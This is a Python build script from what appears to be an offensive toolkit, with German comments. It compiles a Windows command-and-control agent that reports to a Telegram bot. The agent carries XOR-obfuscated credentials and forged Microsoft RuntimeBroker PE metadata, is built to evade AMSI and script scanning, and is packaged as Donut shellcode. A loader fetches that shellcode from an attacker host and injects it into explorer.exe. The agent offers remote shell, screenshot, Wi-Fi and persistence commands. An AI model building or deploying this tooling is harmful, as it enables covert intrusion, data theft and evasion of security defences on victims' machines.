"""
Go-Agent Builder — kompiliert einen Windows EXE C2-Agent aus dem Go-Template.

Vorteile gegenüber PS1:
  - Kein PowerShell → kein AMSI
  - Kein Script-Scanning
  - XOR-obfuskierte Credentials (kein Klartext im Binary)
  - Symbols stripped → schwerer zu reverse-engineeren
  - PE-Metadaten: sieht aus wie echter Microsoft RuntimeBroker
  - Läuft überall: kein HTTP-Server nötig nach Delivery
"""
from __future__ import annotations
import os
import random
import shutil
import subprocess
import tempfile
from pathlib import Path
from typing import AsyncGenerator

from core.danger import DangerLevel
from ui.widgets.help_panel import ToolHelp

HELP = ToolHelp(
    name="Go Agent Builder",
    description="Kompiliert Windows EXE C2-Agent (Go, XOR-obfuskiert, Microsoft PE-Metadaten).",
    usage="Token + Chat-ID eingeben → agent.exe wird gebaut.",
    danger_note="⛔ BLACK — nur auf autorisierten Zielen.",
    example="agent.exe startet, meldet sich via Telegram, antwortet auf !shell Befehle",
)

DANGER = DangerLevel.BLACK

_TMPL  = Path(__file__).parent / "go_agent" / "agent.go.tmpl"
_GOMOD = "module agent\n\ngo 1.21\n"

# PE version info — sieht aus wie echter Windows RuntimeBroker
# Windows .rc source for version info — compiled via windres (mingw)
_VERSION_RC = '''\
#include <windows.h>
VS_VERSION_INFO VERSIONINFO
FILEVERSION     10,0,22621,2506
PRODUCTVERSION  10,0,22621,2506
FILEFLAGSMASK   VS_FFI_FILEFLAGSMASK
FILEFLAGS       0
FILEOS          VOS_NT_WINDOWS32
FILETYPE        VFT_APP
FILESUBTYPE     VFT2_UNKNOWN
BEGIN
  BLOCK "StringFileInfo"
  BEGIN
    BLOCK "040904B0"
    BEGIN
      VALUE "CompanyName",      "Microsoft Corporation"
      VALUE "FileDescription",  "Runtime Broker"
      VALUE "FileVersion",      "10.0.22621.2506 (WinBuild.160101.0800)"
      VALUE "InternalName",     "RuntimeBroker"
      VALUE "LegalCopyright",   "\\xa9 Microsoft Corporation. All rights reserved."
      VALUE "OriginalFilename", "RuntimeBroker.exe"
      VALUE "ProductName",      "Microsoft\\xae Windows\\xae Operating System"
      VALUE "ProductVersion",   "10.0.22621.2506"
    END
  END
  BLOCK "VarFileInfo"
  BEGIN
    VALUE "Translation", 0x0409, 0x04B0
  END
END
'''


_LOADER_TMPL = Path(__file__).parent / "loader" / "loader.c.tmpl"


def is_go_available() -> bool:
    return shutil.which("go") is not None


def _xenc(s: str, key: int) -> str:
    """String → Go byte-array literal (XOR encoded)."""
    return ','.join(f'0x{b ^ key:02X}' for b in s.encode('utf-8'))


def _find_windres() -> str | None:
    for name in ("x86_64-w64-mingw32-windres", "windres"):
        p = shutil.which(name)
        if p:
            return p
    return None


def _find_mingw_gcc() -> str | None:
    for name in ("x86_64-w64-mingw32-gcc", "i686-w64-mingw32-gcc"):
        p = shutil.which(name)
        if p:
            return p
    return None


def _find_donut() -> str | None:
    """Sucht donut-shellcode Python-Modul."""
    try:
        import donut  # noqa: F401
        return "python3-donut"
    except ImportError:
        return None


def _make_shellcode(exe_path: str, out_dir: str) -> tuple[str | None, str]:
    """
    Konvertiert EXE → Donut-Shellcode → XOR-verschlüsselt → a.bin.
    Returns (path_to_bin | None, log).
    """
    try:
        import donut
    except ImportError:
        return None, "[!] donut nicht installiert (pip3 install donut-shellcode)"

    sc_raw = donut.create(file=exe_path, arch=3)  # arch=3 = amd64
    if not sc_raw:
        return None, "[!] donut: Shellcode-Erstellung fehlgeschlagen"

    xk = random.randint(0x21, 0x7E)
    sc_enc = bytes(b ^ xk for b in sc_raw)
    out_bin = os.path.join(out_dir, "a.bin")
    with open(out_bin, "wb") as f:
        f.write(sc_enc)
    return out_bin, f"[+] Shellcode: {len(sc_raw):,} bytes → XOR(0x{xk:02X}) → a.bin\n__XK__={xk}"


def _build_loader(sc_url: str, xor_key: int, out_dir: str) -> tuple[str | None, str]:
    """
    Kompiliert den C-Shellcode-Loader via mingw.
    Returns (path_to_loader_exe | None, log).
    """
    gcc = _find_mingw_gcc()
    if not gcc:
        return None, "[!] mingw-gcc nicht gefunden (apt install mingw-w64)"

    tmpl = _LOADER_TMPL.read_text()
    src  = (tmpl
            .replace('TMPL_SC_URL',  f'"{sc_url}"')
            .replace('TMPL_XOR_KEY', str(xor_key)))

    out_loader = os.path.join(out_dir, "loader.exe")

    with tempfile.TemporaryDirectory() as tmp:
        src_path = Path(tmp, "loader.c")
        src_path.write_text(src)
        cmd = [
            gcc, str(src_path),
            "-o", out_loader,
            "-O2", "-s",
            "-mwindows",          # no console window
            "-lwininet",
            "-static-libgcc",
            "-static-libstdc++",
        ]
        r = subprocess.run(cmd, capture_output=True, text=True)

    if os.path.exists(out_loader):
        return out_loader, r.stderr.strip()
    return None, r.stderr or "loader-Kompilierung fehlgeschlagen"


def generate_source(token: str, chat_id: str, interval: int = 10) -> tuple[str, int]:
    """Returns (go_source, xor_key)."""
    key = random.randint(0x11, 0x7E)
    tmpl = _TMPL.read_text()
    src = (
        tmpl
        .replace('TMPL_XOR_KEY',   f'0x{key:02X}')
        .replace('TMPL_ENC_API',   _xenc("https://api.telegram.org/bot", key))
        .replace('TMPL_ENC_TOKEN', _xenc(token, key))
        .replace('TMPL_ENC_CHAT',  _xenc(chat_id, key))
        .replace('TMPL_SLEEP',     '20')
        .replace('TMPL_INTERVAL',  str(interval))
    )
    return src, key


def build(
    token: str,
    chat_id: str,
    output_dir: str,
    interval: int = 10,
    use_garble: bool = False,
    lhost: str = "",
    lport: int = 8888,
) -> tuple[str | None, str]:
    """
    Vollständige Build-Pipeline:
      1. Go-Agent EXE (garble + PE-Metadaten)
      2. Donut → Shellcode → XOR-verschlüsselt (a.bin)
      3. C-Loader EXE (lädt a.bin in explorer.exe)
    Returns (path_to_loader_exe | None, log).
    """
    if not is_go_available():
        return None, "Go nicht installiert (apt install golang)"

    src, key = generate_source(token, chat_id, interval)
    out_exe  = os.path.join(output_dir, "agent.exe")
    logs     = []

    with tempfile.TemporaryDirectory() as tmp:
        Path(tmp, "go.mod").write_text(_GOMOD)
        Path(tmp, "main.go").write_text(src)

        # ── PE-Metadaten via windres ──────────────────────────────────────────
        windres = _find_windres()
        if windres:
            rc_path   = Path(tmp, "versioninfo.rc")
            syso_path = Path(tmp, "resource.syso")
            rc_path.write_text(_VERSION_RC)
            r_rc = subprocess.run(
                [windres, "-i", str(rc_path), "-O", "coff", "-o", str(syso_path)],
                capture_output=True, text=True, cwd=tmp,
            )
            if r_rc.returncode != 0 or not syso_path.exists():
                logs.append(f"[!] windres: {r_rc.stderr.strip()}")
            else:
                logs.append("[+] PE-Metadaten: Microsoft RuntimeBroker")
        else:
            logs.append("[!] windres fehlt — kein PE-Metadaten")

        env = os.environ.copy()
        env.update({"GOOS": "windows", "GOARCH": "amd64", "CGO_ENABLED": "0"})

        garble = shutil.which("garble")
        if use_garble and garble:
            cmd = [garble, "-seed=random", "build",
                   "-ldflags=-s -w -H windowsgui", "-trimpath", "-o", out_exe, "."]
        else:
            cmd = ["go", "build",
                   "-ldflags=-s -w -H windowsgui", "-trimpath", "-o", out_exe, "."]

        r = subprocess.run(cmd, capture_output=True, text=True, env=env, cwd=tmp)
        if r.stderr.strip():
            err_lines = [l for l in r.stderr.splitlines() if "warning" not in l and l.strip()]
            if err_lines:
                logs.extend(err_lines)

    if not os.path.exists(out_exe):
        return None, "\n".join(logs) or "Go-Build fehlgeschlagen"
    logs.append(f"[+] agent.exe: {os.path.getsize(out_exe):,} bytes")

    # ── Donut: EXE → Shellcode ────────────────────────────────────────────
    sc_bin, sc_log = _make_shellcode(out_exe, output_dir)
    if sc_bin:
        # Extract XOR key from log
        xk_line = next((l for l in sc_log.splitlines() if "__XK__=" in l), "")
        sc_xk   = int(xk_line.split("=")[1]) if xk_line else 0x42
        logs.append(sc_log.split("\n__XK__=")[0])

        # ── C-Loader kompilieren ──────────────────────────────────────────
        if lhost:
            sc_url = f"http://{lhost}:{lport}/a.bin"
        else:
            sc_url = f"http://LHOST:{lport}/a.bin"

        loader_exe, loader_log = _build_loader(sc_url, sc_xk, output_dir)
        if loader_exe:
            logs.append(f"[+] loader.exe: {os.path.getsize(loader_exe):,} bytes — injects into explorer.exe")
            return loader_exe, "\n".join(logs)
        else:
            logs.append(f"[!] Loader-Build: {loader_log}")
            logs.append("[*] Fallback: agent.exe wird direkt ausgeliefert")
    else:
        logs.append(sc_log)
        logs.append("[*] Fallback: agent.exe wird direkt ausgeliefert")

    return out_exe, "\n".join(logs)


async def run(
    token: str,
    chat_id: str,
    output_dir: str,
    interval: int = 10,
) -> AsyncGenerator[str, None]:
    """Stream-Output für PenKit-Menü."""
    yield "[*] Kompiliere Go-Agent für Windows x64..."
    yield "[*] Keine PS1-Signaturen — kein AMSI — direkte EXE"
    yield ""

    garble_ok  = bool(shutil.which("garble"))
    windres_ok = bool(_find_windres())

    if garble_ok:
        yield "[*] garble gefunden → erweiterte Obfuskierung aktiv"
    else:
        yield "[!] garble nicht gefunden → Standard-Build"
        yield "    (go install mvdan.cc/garble@latest)"

    if windres_ok:
        yield "[*] windres gefunden → PE-Metadaten: Microsoft RuntimeBroker"
    else:
        yield "[!] windres nicht gefunden → kein PE-Metadaten"
        yield "    (apt install mingw-w64)"
    yield ""

    exe, log = build(token, chat_id, output_dir, interval, use_garble=garble_ok)

    for line in log.strip().splitlines():
        yield f"  {line}"

    if exe:
        size = os.path.getsize(exe)
        yield ""
        yield f"[+] agent.exe gebaut: {exe}"
        yield f"[+] Größe: {size:,} Bytes"
        yield ""
        yield "[*] Delivery:"
        yield "    Direkt ausführen:  agent.exe"
        yield "    Via HTA/HTTP:      Auto-Delivery benutzt agent.exe automatisch"
        yield ""
        yield "[*] Nach Ausführung auf Ziel:"
        yield "    → Task Manager zeigt: RuntimeBroker.exe (Microsoft Corporation)"
        yield "    → Telegram-Nachricht '🟢 Agent online'"
        yield "    → Befehle: !help  !sysinfo  !screenshot  !wifi  !persist  !exit"
    else:
        yield ""
        yield "[!] Build fehlgeschlagen — siehe Fehler oben"
